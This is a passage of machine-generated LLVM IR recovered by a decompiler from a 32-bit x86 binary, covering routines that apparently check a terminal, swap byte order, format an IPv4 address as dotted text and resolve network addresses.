  %v1_805212726 = icmp eq i1 %v4_805212524, false
  br i1 %v1_805212726, label %dec_label_pc_805212d.lr.ph, label %dec_label_pc_805215d

dec_label_pc_805215b:                             ; preds = %dec_label_pc_8052151
  br label %dec_label_pc_805215d

dec_label_pc_805215d:                             ; preds = %dec_label_pc_8052158, %dec_label_pc_8052110, %dec_label_pc_805214d, %dec_label_pc_805215b
  %storemerge = phi i32 [ 0, %dec_label_pc_805215b ], [ %v4_8052117, %dec_label_pc_8052110 ], [ %v1_8052158, %dec_label_pc_8052158 ], [ %v0_805215840, %dec_label_pc_805214d ]
  store i32 %v0_8052113, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_805212320, { 1, 2, 0 }
  uselistorder i8 %v2_8052123, { 1, 2, 0 }
  uselistorder i8* %v1_8052123, { 1, 0 }
  uselistorder i32 %v0_8052137, { 1, 2, 3, 0 }
  uselistorder i8 %v2_805212d, { 1, 0, 2 }
  uselistorder i32 %v0_805214e27, { 1, 0 }
  uselistorder i8 %v2_80521232033, { 0, 2, 1 }
  uselistorder i8* %v1_805212319, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805215d, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_805212d, { 1, 0 }
  uselistorder label %dec_label_pc_805212d.lr.ph, { 1, 0 }
}

define i32 @function_8052180(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052180:
  %stack_var_-60 = alloca i32, align 4
  %v3_805218c = call i32 @function_80521a0(i32 %arg1, i32* nonnull %stack_var_-60)
  %v1_8052191 = icmp eq i32 %v3_805218c, 0
  %v1_8052193 = zext i1 %v1_8052191 to i32
  ret i32 %v1_8052193
}

define i32 @function_80521a0(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_80521a0:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_5()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = ptrtoint i32* %arg2 to i32
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80521a0 = load i32, i32* @esi, align 4
  %v0_80521a1 = load i32, i32* @ebx, align 4
  store i32 %v0_80521a1, i32* %stack_var_-8, align 4
  %v2_80521a5 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_80521a5, i32* %eax.global-to-local, align 4
  store i32 %tmp8, i32* @ebx, align 4
  %v3_80521b7 = call i32 @function_8050c98(i32 %arg1, i32 21505, i32 %v2_80521a5)
  store i32 %v3_80521b7, i32* %eax.global-to-local, align 4
  %v1_80521bf = icmp eq i32 %v3_80521b7, 0
  store i32 %v3_80521b7, i32* @esi, align 4
  %v1_80521c3 = icmp eq i1 %v1_80521bf, false
  br i1 %v1_80521c3, label %dec_label_pc_8052208, label %dec_label_pc_80521c5

dec_label_pc_80521c5:                             ; preds = %dec_label_pc_80521a0
  %v3_80521c5 = load i32, i32* %stack_var_-44, align 4
  %v1_80521c9 = load i32, i32* @ebx, align 4
  %v2_80521c9 = inttoptr i32 %v1_80521c9 to i32*
  store i32 %v3_80521c5, i32* %v2_80521c9, align 4
  %v1_80521cf = load i32, i32* @ebx, align 4
  %v2_80521cf = add i32 %v1_80521cf, 4
  %v3_80521cf = inttoptr i32 %v2_80521cf to i32*
  %v1_80521d6 = load i32, i32* @ebx, align 4
  %v2_80521d6 = add i32 %v1_80521d6, 8
  %v3_80521d6 = inttoptr i32 %v2_80521d6 to i32*
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v1_80521dd = load i32, i32* @ebx, align 4
  %v2_80521dd = add i32 %v1_80521dd, 12
  %v3_80521dd = inttoptr i32 %v2_80521dd to i32*
  store i32 %tmp3, i32* %v3_80521dd, align 4
  %v4_80521e0 = zext i8 %tmp to i32
  %v5_80521e0 = load i32, i32* %eax.global-to-local, align 4
  %v6_80521e0 = and i32 %v5_80521e0, -256
  %v7_80521e0 = or i32 %v6_80521e0, %v4_80521e0
  store i32 %v7_80521e0, i32* %eax.global-to-local, align 4
  %v2_80521e4 = load i32, i32* @ebx, align 4
  %v3_80521e4 = add i32 %v2_80521e4, 16
  %v4_80521e4 = inttoptr i32 %v3_80521e4 to i8*
  store i8 %tmp, i8* %v4_80521e4, align 1
  %v0_80521e7 = load i32, i32* %eax.global-to-local, align 4
  %v2_80521ea = ptrtoint i32* %stack_var_-27 to i32
  %v0_80521ef = load i32, i32* @ebx, align 4
  %v1_80521ef = add i32 %v0_80521ef, 17
  store i32 %v1_80521ef, i32* %eax.global-to-local, align 4
  %v4_80521f3 = call i32 @function_805511c(i32 %v1_80521ef, i32 %v2_80521ea, i32 19, i32 %v0_80521e7)
  store i32 %v4_80521f3, i32* %eax.global-to-local, align 4
  %v3_8052200 = inttoptr i32 %v4_80521f3 to i8*
  %v4_8052200 = call i32 @function_8051e84(i8* %v3_8052200, i32 0, i32 13)
  store i32 %v4_8052200, i32* %eax.global-to-local, align 4
  %v0_805220b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052208

dec_label_pc_8052208:                             ; preds = %dec_label_pc_80521a0, %dec_label_pc_80521c5
  %v0_805220b = phi i32 [ %v3_80521b7, %dec_label_pc_80521a0 ], [ %v0_805220b.pre, %dec_label_pc_80521c5 ]
  store i32 %v0_805220b, i32* %eax.global-to-local, align 4
  %v2_805220d = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805220d, i32* @ebx, align 4
  store i32 %v0_80521a0, i32* @esi, align 4
  ret i32 %v0_805220b

; uselistorder directives
  uselistorder i32 %v0_805220b, { 1, 0 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_8052208, { 1, 0 }
}

define i32 @function_8052210(i16 %arg1) local_unnamed_addr {
dec_label_pc_8052210:
  %v3_8052215 = call i16 @llvm.bswap.i16(i16 %arg1)
  %v4_8052215 = zext i16 %v3_8052215 to i32
  ret i32 %v4_8052215
}

define i32 @function_805221d(i32 %arg1) local_unnamed_addr {
dec_label_pc_805221d:
  %v1_8052221 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_8052221
}

define i32 @function_8052231(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052231:
  %v1_8052235 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_8052235
}

define i32 @function_8052238(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052238:
  %v6_8052244 = icmp ugt i32 %arg1, 4
  br i1 %v6_8052244, label %dec_label_pc_805224d, label %dec_label_pc_8052246

dec_label_pc_8052246:                             ; preds = %dec_label_pc_8052238
  %v1_8052246 = mul i32 %arg1, 4
  %v2_8052246 = add i32 %v1_8052246, ptrtoint ([5 x i8*]* @global_var_805cd28.330 to i32)
  %v3_8052246 = inttoptr i32 %v2_8052246 to i32*
  %v4_8052246 = load i32, i32* %v3_8052246, align 4
  br label %dec_label_pc_805224d

dec_label_pc_805224d:                             ; preds = %dec_label_pc_8052238, %dec_label_pc_8052246
  %v0_805224d = phi i32 [ ptrtoint ([15 x i8]* @global_var_805cd3c.324 to i32), %dec_label_pc_8052238 ], [ %v4_8052246, %dec_label_pc_8052246 ]
  ret i32 %v0_805224d

; uselistorder directives
  uselistorder label %dec_label_pc_805224d, { 1, 0 }
}

define i32 @function_805224e(i8* %arg1) local_unnamed_addr {
dec_label_pc_805224e:
  %v4_8052253 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052253, i32* @ebx, align 4
  %v2_8052257 = icmp eq i8* %arg1, null
  br i1 %v2_8052257, label %dec_label_pc_8052265, label %dec_label_pc_805225b

dec_label_pc_805225b:                             ; preds = %dec_label_pc_805224e
  %v3_805225b = load i8, i8* %arg1, align 1
  %v4_805225b = icmp eq i8 %v3_805225b, 0
  %v1_8052263 = icmp eq i1 %v4_805225b, false
  br i1 %v1_8052263, label %dec_label_pc_805226a, label %dec_label_pc_8052265

dec_label_pc_8052265:                             ; preds = %dec_label_pc_805225b, %dec_label_pc_805224e
  br label %dec_label_pc_805226a

dec_label_pc_805226a:                             ; preds = %dec_label_pc_805225b, %dec_label_pc_8052265
  %storemerge = phi i32 [ ptrtoint (i32* @global_var_805cd4d.332 to i32), %dec_label_pc_8052265 ], [ ptrtoint ([3 x i8]* @global_var_805cd4b.331 to i32), %dec_label_pc_805225b ]
  store i32 %storemerge, i32* @esi, align 4
  %v0_805226a = call i32 @function_8054608()
  store i32 ptrtoint ([15 x i8]* @global_var_805cd3c.324 to i32), i32* @edx, align 4
  %v1_8052274 = inttoptr i32 %v0_805226a to i32*
  %v2_8052274 = load i32, i32* %v1_8052274, align 4
  %v6_8052279 = icmp ugt i32 %v2_8052274, 4
  br i1 %v6_8052279, label %dec_label_pc_8052282, label %dec_label_pc_805227b

dec_label_pc_805227b:                             ; preds = %dec_label_pc_805226a
  %v1_805227b = mul i32 %v2_8052274, 4
  %v2_805227b = add i32 %v1_805227b, ptrtoint ([5 x i8*]* @global_var_805cd28.330 to i32)
  %v3_805227b = inttoptr i32 %v2_805227b to i32*
  %v4_805227b = load i32, i32* %v3_805227b, align 4
  store i32 %v4_805227b, i32* @edx, align 4
  br label %dec_label_pc_8052282

dec_label_pc_8052282:                             ; preds = %dec_label_pc_805226a, %dec_label_pc_805227b
  %v0_8052285 = phi i32 [ ptrtoint ([15 x i8]* @global_var_805cd3c.324 to i32), %dec_label_pc_805226a ], [ %v4_805227b, %dec_label_pc_805227b ]
  %v0_8052286 = load i32, i32* @esi, align 4
  %v0_805228d = load i32, i32* inttoptr (i32 134604336 to i32*), align 16
  %v9_8052293 = call i32 @function_8054700(i32 %v0_805228d, i32 ptrtoint ([8 x i8]* @global_var_805ccba.333 to i32), i32 %v4_8052253, i32 %v0_8052286, i32 %v0_8052285)
  ret i32 %v9_8052293

; uselistorder directives
  uselistorder i32 ptrtoint ([15 x i8]* @global_var_805cd3c.324 to i32), { 0, 2, 1 }
  uselistorder i8* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052282, { 1, 0 }
  uselistorder label %dec_label_pc_805226a, { 1, 0 }
}

define i32 @function_80522a0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80522a0:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80522a0 = load i32, i32* @edi, align 4
  store i32 0, i32* @edi, align 4
  %v0_80522a3 = load i32, i32* @esi, align 4
  store i32 0, i32* @esi, align 4
  %v0_80522a6 = load i32, i32* @ebx, align 4
  store i32 %v0_80522a6, i32* %stack_var_-12, align 4
  %v1_80522af = call i32 @llvm.bswap.i32(i32 %arg1)
  %sext = mul i32 %v1_80522af, 16777216
  %v1_80522b1 = sdiv i32 %sext, 16777216
  store i32 %v1_80522b1, i32* @ebx, align 4
  %v1_80522b3 = add i32 %arg2, 15
  store i32 %v1_80522b3, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80522b8

dec_label_pc_80522b8:                             ; preds = %dec_label_pc_80522a0, %dec_label_pc_80522dd
  %v0_80522bf17 = phi i32 [ %v1_80522b1, %dec_label_pc_80522a0 ], [ %v2_80522dd, %dec_label_pc_80522dd ]
  %v0_80522e916 = phi i32 [ %v1_80522b3, %dec_label_pc_80522a0 ], [ %v0_80522e1, %dec_label_pc_80522dd ]
  %v1_80522c3 = urem i32 %v0_80522bf17, 256
  %v5_80522cb = inttoptr i32 %v0_80522e916 to i8*
  %v6_80522cb = call i32 @function_80549cc(i8* %v5_80522cb, i32 %v1_80522c3, i32 0, i32 -10, i32 0)
  %v0_80522d3 = load i32, i32* @esi, align 4
  %v1_80522d3 = icmp eq i32 %v0_80522d3, 0
  %v1_80522d5 = add i32 %v6_80522cb, -1
  store i32 %v1_80522d5, i32* %ecx.global-to-local, align 4
  br i1 %v1_80522d3, label %dec_label_pc_80522dd, label %dec_label_pc_80522da

dec_label_pc_80522da:                             ; preds = %dec_label_pc_80522b8
  %v1_80522da = inttoptr i32 %v0_80522d3 to i8*
  store i8 46, i8* %v1_80522da, align 1
  %v0_80522e1.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80522dd

dec_label_pc_80522dd:                             ; preds = %dec_label_pc_80522b8, %dec_label_pc_80522da
  %v0_80522e1 = phi i32 [ %v1_80522d5, %dec_label_pc_80522b8 ], [ %v0_80522e1.pre, %dec_label_pc_80522da ]
  %v0_80522dd = load i32, i32* @ebx, align 4
  %v2_80522dd = udiv i32 %v0_80522dd, 256
  store i32 %v2_80522dd, i32* @ebx, align 4
  %v0_80522e0 = load i32, i32* @edi, align 4
  %v1_80522e0 = add i32 %v0_80522e0, 1
  store i32 %v1_80522e0, i32* @edi, align 4
  store i32 %v0_80522e1, i32* @esi, align 4
  %v7_80522e6 = icmp sgt i32 %v1_80522e0, 3
  br i1 %v7_80522e6, label %dec_label_pc_80522e8, label %dec_label_pc_80522b8

dec_label_pc_80522e8:                             ; preds = %dec_label_pc_80522dd
  %v2_80522e8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80522e8, i32* @ebx, align 4
  %v1_80522e9 = add i32 %v0_80522e1, 1
  store i32 %v0_80522a3, i32* @esi, align 4
  store i32 %v0_80522a0, i32* @edi, align 4
  ret i32 %v1_80522e9

; uselistorder directives
  uselistorder i32 %v0_80522e1, { 0, 2, 1 }
  uselistorder i32 %v1_80522b1, { 1, 0 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @function_80549cc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80522dd, { 1, 0 }
  uselistorder label %dec_label_pc_80522b8, { 1, 0 }
}

define i32 @function_80522ef(i32 %arg1) local_unnamed_addr {
dec_label_pc_80522ef:
  %v2_80522fb = call i32 @function_80522a0(i32 %arg1, i32 ptrtoint (i32* @global_var_8064904.334 to i32))
  ret i32 %v2_80522fb
}

define i32 @function_8052304(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052304:
  %stack_var_-4 = alloca i32, align 4
  %v2_8052307 = ptrtoint i32* %stack_var_-4 to i32
  %v2_8052310 = inttoptr i32 %arg1 to i8*
  %v3_8052310 = call i32 @function_8055274(i8* %v2_8052310, i32 %v2_8052307)
  %v1_805231b = icmp eq i32 %v3_8052310, 0
  br i1 %v1_805231b, label %dec_label_pc_8052323, label %dec_label_pc_805231f

dec_label_pc_805231f:                             ; preds = %dec_label_pc_8052304
  %v3_805231f = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052323

dec_label_pc_8052323:                             ; preds = %dec_label_pc_8052304, %dec_label_pc_805231f
  %v0_8052323 = phi i32 [ -1, %dec_label_pc_8052304 ], [ %v3_805231f, %dec_label_pc_805231f ]
  ret i32 %v0_8052323

; uselistorder directives
  uselistorder label %dec_label_pc_8052323, { 1, 0 }
}

define i32 @function_805232c(i32 %arg1) local_unnamed_addr {
dec_label_pc_805232c:
  %stack_var_-4 = alloca i32, align 4
  %v0_805232f = call i32 @function_8054608()
  %v0_8052334 = load i32, i32* @edx, align 4
  %v2_8052337 = ptrtoint i32* %stack_var_-4 to i32
  %v9_805234f = call i32 @function_805235c(i32 %arg1, i32* nonnull @global_var_8064aec.336, i32 ptrtoint (i32* @global_var_8064920.335 to i32), i32 460, i32 %v2_8052337, i32 %v0_805232f, i32 %v0_8052334, i32 %v0_8052334)
  %v3_8052354 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_8052354
}

define i32 @function_805235c(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_805235c:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i64 @__decompiler_undefined_function_2()
  %tmp18 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %v0_805235c = load i32, i32* @ebp, align 4
  %v0_805235d = load i32, i32* @edi, align 4
  %v0_805235e = load i32, i32* @esi, align 4
  %v0_805235f = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v1_805236f = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v1_805236f, align 4
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_805237a = icmp eq i32 %arg1, 0
  br i1 %v4_805237a, label %dec_label_pc_8052686, label %dec_label_pc_8052385

dec_label_pc_8052385:                             ; preds = %dec_label_pc_805235c
  %v1_8052385 = call i32 @function_8050f90(i32 %v0_805235f)
  store i32 %v1_8052385, i32* %eax.global-to-local, align 4
  %v1_805238a = inttoptr i32 %v1_8052385 to i32*
  %v2_805238a = load i32, i32* %v1_805238a, align 4
  store i32 %v2_805238a, i32* @edi, align 4
  store i32 %v1_8052385, i32* @esi, align 4
  store i32 0, i32* %v1_805238a, align 4
  %v0_805239d = load i32, i32* @ebx, align 4
  store i32 %v0_805239d, i32* %stack_var_-108, align 4
  %v7_80523a9 = call i32 @function_8055ca0(i32 %arg1, i32 2, i32 %tmp18, i32 %v0_805239d, i32 %arg5, i32 %arg6, i32 %v1_8052385)
  store i32 %v7_80523a9, i32* %eax.global-to-local, align 4
  %v1_80523b1 = icmp eq i32 %v7_80523a9, 0
  br i1 %v1_80523b1, label %dec_label_pc_8052686, label %dec_label_pc_80523b9

dec_label_pc_80523b9:                             ; preds = %dec_label_pc_8052385
  store i32 %arg6, i32* @ecx, align 4
  %v1_80523bd = inttoptr i32 %arg6 to i32*
  %v2_80523bd = load i32, i32* %v1_80523bd, align 4
  store i32 %v2_80523bd, i32* %edx.global-to-local, align 4
  %v9_80523bf = icmp eq i32 %v2_80523bd, 1
  br i1 %v9_80523bf, label %dec_label_pc_80523d9, label %dec_label_pc_80523c4

dec_label_pc_80523c4:                             ; preds = %dec_label_pc_80523b9
  %v9_80523c4 = icmp eq i32 %v2_80523bd, 4
  br i1 %v9_80523c4, label %dec_label_pc_80523d9, label %dec_label_pc_80523c9

dec_label_pc_80523c9:                             ; preds = %dec_label_pc_80523c4
  %v1_80523c9 = add i32 %v2_80523bd, 1
  %v8_80523c9 = icmp eq i32 %v1_80523c9, 0
  store i32 %v1_80523c9, i32* %edx.global-to-local, align 4
  %v1_80523ca = icmp eq i1 %v8_80523c9, false
  br i1 %v1_80523ca, label %dec_label_pc_8052686, label %dec_label_pc_80523d0

dec_label_pc_80523d0:                             ; preds = %dec_label_pc_80523c9
  %v0_80523d0 = load i32, i32* @esi, align 4
  %v1_80523d0 = inttoptr i32 %v0_80523d0 to i32*
  %v2_80523d0 = load i32, i32* %v1_80523d0, align 4
  %v11_80523d0 = icmp eq i32 %v2_80523d0, 2
  %v1_80523d3 = icmp eq i1 %v11_80523d0, false
  br i1 %v1_80523d3, label %dec_label_pc_8052686, label %dec_label_pc_80523d9

dec_label_pc_80523d9:                             ; preds = %dec_label_pc_80523d0, %dec_label_pc_80523c4, %dec_label_pc_80523b9
  %v0_80523d9 = load i32, i32* @ebp, align 4
  %v1_80523db = sub i32 0, %v0_80523d9
  %v1_80523dd = urem i32 %v1_80523db, 4
  %v2_80523dd = icmp eq i32 %v1_80523dd, 0
  store i32 %v1_80523dd, i32* %eax.global-to-local, align 4
  %v0_80523e0 = load i32, i32* @edi, align 4
  %v1_80523e0 = load i32, i32* @esi, align 4
  %v2_80523e0 = inttoptr i32 %v1_80523e0 to i32*
  store i32 %v0_80523e0, i32* %v2_80523e0, align 4
  %v0_80523f4.pre = load i32, i32* @ebx, align 4
  br i1 %v2_80523dd, label %dec_label_pc_80523f0, label %dec_label_pc_80523e4

dec_label_pc_80523e4:                             ; preds = %dec_label_pc_80523d9
  %v1_80523e4 = load i32, i32* %eax.global-to-local, align 4
  %v2_80523e4 = sub i32 %v0_80523f4.pre, %v1_80523e4
  %v7_80523e4 = icmp ult i32 %v0_80523f4.pre, %v1_80523e4
  br i1 %v7_80523e4, label %dec_label_pc_8052681, label %dec_label_pc_80523ec

dec_label_pc_80523ec:                             ; preds = %dec_label_pc_80523e4
  %v0_80523ec = load i32, i32* @ebp, align 4
  %v2_80523ec = add i32 %v0_80523ec, %v1_80523e4
  store i32 %v2_80523ec, i32* @ebp, align 4
  store i32 %v2_80523e4, i32* @ebx, align 4
  br label %dec_label_pc_80523f0

dec_label_pc_80523f0:                             ; preds = %dec_label_pc_80523d9, %dec_label_pc_80523ec
  %v0_80523f4 = phi i32 [ %v2_80523e4, %dec_label_pc_80523ec ], [ %v0_80523f4.pre, %dec_label_pc_80523d9 ]
  store i32 %arg6, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %v1_80523bd, align 4
  %tmp41 = icmp ult i32 %v0_80523f4, 4
  br i1 %tmp41, label %dec_label_pc_8052681, label %dec_label_pc_8052403

dec_label_pc_8052403:                             ; preds = %dec_label_pc_80523f0
  %v0_8052403 = load i32, i32* @ebx, align 4
  %v1_8052403 = add i32 %v0_8052403, -4
  store i32 %v1_8052403, i32* %eax.global-to-local, align 4
  %tmp42 = icmp ult i32 %v1_8052403, 8
  br i1 %tmp42, label %dec_label_pc_8052681, label %dec_label_pc_805240f

dec_label_pc_805240f:                             ; preds = %dec_label_pc_8052403
  %v1_805240f = add i32 %v0_8052403, -12
  store i32 %v1_805240f, i32* %eax.global-to-local, align 4
  %v0_8052412 = load i32, i32* @ebp, align 4
  %v1_8052412 = add i32 %v0_8052412, 4
  store i32 %v1_8052412, i32* %edx.global-to-local, align 4
  store i32 %v1_8052412, i32* %stack_var_-92, align 4
  %v3_805241b = inttoptr i32 %v1_8052412 to i32*
  store i32 %v0_8052412, i32* %v3_805241b, align 4
  %v0_805241e = load i32, i32* %edx.global-to-local, align 4
  %v1_805241e = add i32 %v0_805241e, 4
  %v2_805241e = inttoptr i32 %v1_805241e to i32*
  store i32 0, i32* %v2_805241e, align 4
  %tmp43 = icmp ult i32 %v1_805240f, 32
  br i1 %tmp43, label %dec_label_pc_8052681, label %dec_label_pc_805242b

dec_label_pc_805242b:                             ; preds = %dec_label_pc_805240f
  %v0_805242b = load i32, i32* @ebx, align 4
  %v1_805242b = add i32 %v0_805242b, -44
  store i32 %v1_805242b, i32* @ebx, align 4
  %tmp44 = icmp ult i32 %v1_805242b, 256
  br i1 %tmp44, label %dec_label_pc_8052681, label %dec_label_pc_805243e

dec_label_pc_805243e:                             ; preds = %dec_label_pc_805242b
  %v0_805243e = load i32, i32* @ebp, align 4
  %v1_805243e = add i32 %v0_805243e, 12
  %v1_8052445 = add i32 %v0_805243e, 44
  store i32 %v1_8052445, i32* @edi, align 4
  store i32 %v1_8052445, i32* %stack_var_-108, align 4
  %v4_8052452 = inttoptr i32 %v1_8052445 to i8*
  %v5_8052452 = call i32 @function_8051f0c(i8* %v4_8052452, i32 %arg1, i32 %v1_805242b, i32 %v1_805243e)
  %v0_8052457 = load i32, i32* @edi, align 4
  %v1_8052457 = load i32, i32* @ebp, align 4
  %v2_8052457 = add i32 %v1_8052457, 12
  %v3_8052457 = inttoptr i32 %v2_8052457 to i32*
  store i32 %v0_8052457, i32* %v3_8052457, align 4
  %v1_805245e = add i32 %v0_805243e, 16
  %v2_805245e = inttoptr i32 %v1_805245e to i32*
  store i32 0, i32* %v2_805245e, align 4
  %v2_8052465 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_8052465, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v0_8052467 = load i32, i32* @ebp, align 4
  store i32 %arg1, i32* %stack_var_-108, align 4
  %v2_805246c = inttoptr i32 %arg1 to i8*
  %v3_805246c = call i32 @function_8055274(i8* %v2_805246c, i32 %v0_8052467)
  store i32 %v3_805246c, i32* %eax.global-to-local, align 4
  %v1_8052474 = icmp eq i32 %v3_805246c, 0
  br i1 %v1_8052474, label %dec_label_pc_80524b0, label %dec_label_pc_8052478

dec_label_pc_8052478:                             ; preds = %dec_label_pc_805243e
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  %v0_805247c = load i32, i32* @edi, align 4
  store i32 %v0_805247c, i32* %arg2, align 4
  %v1_805247e = add i32 %tmp18, 8
  %v2_805247e = inttoptr i32 %v1_805247e to i32*
  store i32 2, i32* %v2_805247e, align 4
  %v0_8052485 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052485 = add i32 %v0_8052485, 12
  %v2_8052485 = inttoptr i32 %v1_8052485 to i32*
  store i32 4, i32* %v2_8052485, align 4
  %v2_805248c = load i32, i32* %stack_var_-92, align 4
  %v1_805248f = load i32, i32* %edx.global-to-local, align 4
  %v2_805248f = add i32 %v1_805248f, 16
  %v3_805248f = inttoptr i32 %v2_805248f to i32*
  store i32 %v2_805248c, i32* %v3_805248f, align 4
  %v1_8052496 = load i32, i32* %edx.global-to-local, align 4
  %v2_8052496 = add i32 %v1_8052496, 4
  %v3_8052496 = inttoptr i32 %v2_8052496 to i32*
  store i32 %v1_805243e, i32* %v3_8052496, align 4
  store i32 %arg5, i32* @ecx, align 4
  %v0_805249d = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_805249d, i32* %v1_805236f, align 4
  store i32 0, i32* %v1_80523bd, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052686

dec_label_pc_80524b0:                             ; preds = %dec_label_pc_805243e
  %v0_80524b0 = call i32 @function_8055a5c()
  store i32 %v0_80524b0, i32* @eax, align 4
  %v2_80524c0 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_80524c0, i32* @ebx, align 4
  store i32 %v2_80524c0, i32* %stack_var_-108, align 4
  %v2_80524c5 = call i32 @function_805405a(i32 %v2_80524c0, i32 134561879)
  store i32 %v2_80524c5, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805e888.337 to i32), i32* %stack_var_-108, align 4
  %v1_80524d1 = call i32 @function_8054057(i32 ptrtoint (i32* @global_var_805e888.337 to i32))
  %v0_80524d6 = load i32, i32* @global_var_8064f74.338, align 4
  store i32 %v0_80524d6, i32* @esi, align 4
  store i32 ptrtoint (i32* @global_var_805e888.337 to i32), i32* @ecx, align 4
  store i32 134561879, i32* @eax, align 4
  store i32 %v2_80524c0, i32* %stack_var_-108, align 4
  %v2_80524e1 = call i32 @function_805405a(i32 %v2_80524c0, i32 1)
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_80524fc = ptrtoint i32* %stack_var_-76 to i32
  %v2_8052501 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8052501, i32* %eax.global-to-local, align 4
  store i32 %v2_8052501, i32* %stack_var_-108, align 4
  %v0_805250b = load i32, i32* @esi, align 4
  %v7_8052512 = call i32 @function_8055308(i8* %v2_805246c, i32 1, i32 %v0_805250b, i32 ptrtoint (i32* @global_var_8064f68.339 to i32), i32 %v2_8052501, i32 %v2_80524fc)
  store i32 %v7_8052512, i32* %eax.global-to-local, align 4
  %v2_805251a = icmp slt i32 %v7_8052512, 0
  %v1_805251c = icmp eq i1 %v2_805251a, false
  br i1 %v1_805251c, label %dec_label_pc_8052532, label %dec_label_pc_805251e

dec_label_pc_805251e:                             ; preds = %dec_label_pc_80524b0
  store i32 %arg6, i32* @ecx, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  store i32 1, i32* %v1_80523bd, align 4
  br label %dec_label_pc_8052686

dec_label_pc_8052532:                             ; preds = %dec_label_pc_80524b0
  %v4_8052532 = trunc i64 %tmp11 to i32
  store i32 %v4_8052532, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v10_8052545 = icmp ugt i32 %v1_805242b, 256
  %v15_8052545 = icmp eq i32 %v0_805242b, 300
  %v2_8052549 = or i1 %v10_8052545, %v15_8052545
  br i1 %v2_8052549, label %dec_label_pc_80525e4, label %dec_label_pc_805254b

dec_label_pc_805254b:                             ; preds = %dec_label_pc_8052532
  %v3_805254e = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_805254e, i32* %stack_var_-108, align 4
  %v1_8052552 = call i32 @function_8053391(i32 %v3_805254e)
  store i32 %v1_8052552, i32* %eax.global-to-local, align 4
  store i32 %v3_805254e, i32* @edi, align 4
  %v3_8052558 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8052558, i32* %stack_var_-108, align 4
  %v1_805255c = call i32 @function_8053391(i32 %v3_8052558)
  store i32 -1, i32* %v1_80523bd, align 4
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805265c

dec_label_pc_80525e4:                             ; preds = %dec_label_pc_8052532
  %v3_80525e9.pre = load i32, i32* %stack_var_-76, align 4
  %v0_80525ed.pre = load i32, i32* @edi, align 4
  store i32 %v0_80525ed.pre, i32* %stack_var_-108, align 4
  %v4_80525ee = inttoptr i32 %v0_80525ed.pre to i8*
  %v5_80525ee = call i32 @function_8051f0c(i8* %v4_80525ee, i32 %v3_80525e9.pre, i32 %v1_805242b, i32 %v2_80524c0)
  store i32 %v5_80525ee, i32* %eax.global-to-local, align 4
  store i32 %v0_80525ed.pre, i32* @ecx, align 4
  %v3_80525f4 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_80525f4, i32* %stack_var_-108, align 4
  %v1_80525f8 = call i32 @function_8053391(i32 %v3_80525f4)
  store i32 %v1_80525f8, i32* %eax.global-to-local, align 4
  %v12_8052600 = icmp eq i32 %tmp10, 1
  %v1_8052605 = icmp eq i1 %v12_8052600, false
